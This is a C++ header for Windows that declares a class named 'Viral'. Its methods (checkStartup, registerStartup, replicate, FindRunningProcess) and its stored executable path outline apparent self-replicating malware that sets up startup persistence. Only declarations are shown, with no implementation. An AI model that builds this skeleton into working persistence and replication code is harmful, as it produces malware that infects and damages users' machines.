#pragma once

#include <windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <Lmcons.h>
#include <tlhelp32.h>
#include <tchar.h>

#define PROG_ARG	L""

class Viral
{
public:
	Viral();
	~Viral();
	bool checkStartup();
	void registerStartup();
	void replicate();
	bool FindRunningProcess();
private:
	std::string nameProg;
	LPCWSTR nameProgW;
	char PathToExe[MAX_PATH];
	wchar_t PathToExeW[MAX_PATH];
};